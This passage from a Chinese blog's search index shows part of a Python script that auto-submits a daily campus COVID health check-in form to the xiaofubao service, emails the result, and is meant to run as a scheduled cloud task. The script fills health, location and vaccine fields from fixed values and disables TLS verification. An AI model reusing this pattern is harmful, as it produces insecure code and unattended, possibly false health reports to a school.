class="string">&#x27;className&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;provinceCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;province&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cityCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;inSchool&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;contactArea&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;isPatient&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;contactPatient&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;linkPhone&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;parentsPhone&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;locationInfo&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;longitudeAndLatitude&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;isSuspected&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;healthStatusNew&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;holidayInSchool&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;identitySecondType&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;districtCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;district&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;isFamiliyPatient&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;isCommunityPatient&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;isTodayBack&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;patientHospital&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;isolatedPlace&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;country&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vaccineStatus&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;noVaccineReason&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vaccineOneTime&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vaccineTwoTime&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vaccineThreeTime&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;deviceId&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lastNucleicAcidDate&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;roommateHealthStatus&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backWay&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backWayName&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backAddress&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;inGovQuarantine&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;inSchoolQuarantine&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;inHomeQuarantine&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;nucleicAcidFlag&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;isInCompany&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backRemark&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backProvinceCode&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backProvince&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backCityCode&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backCity&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backDistrictCode&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backDistrict&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;loginUserId&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ymId&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sessionId&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;loginUserName&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;loginSchoolCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;loginSchoolName&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;platform&#x27;</span>: <span class="string">&#x27;YUNMA_APP&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.post(</span><br><span class="line">    <span class="string">&quot;https://h5.xiaofubao.com/marketing/health/doDetail&quot;</span>, headers=h, data=d, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.json()[<span class="string">&#x27;success&#x27;</span>] == <span class="literal">True</span>:</span><br><span class="line">    sendEmail(<span class="string">&quot;【填你的邮箱，用于接收打卡是否成功的消息】&quot;</span>, <span class="string">&quot;打卡成功&quot;</span>, <span class="string">&quot;嘿嘿嘿，恭喜你，打卡成功啦~&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;打卡成功！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sendEmail(<span class="string">&quot;【填你的邮箱，用于接收打卡是否成功的消息】&quot;</span>, <span class="string">&quot;打卡失败&quot;</span>, <span class="string">&quot;哎，别沮丧啊！打卡失败了呢！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;打卡失败！&quot;</span>)</span><br></pre></td></tr></table></figure><p>8、调试代码没问题之后，把代码挂到云服务器上（没有云服务器，可以用<strong>腾讯云函数</strong>），设置定时任务即可</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自动化脚本 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
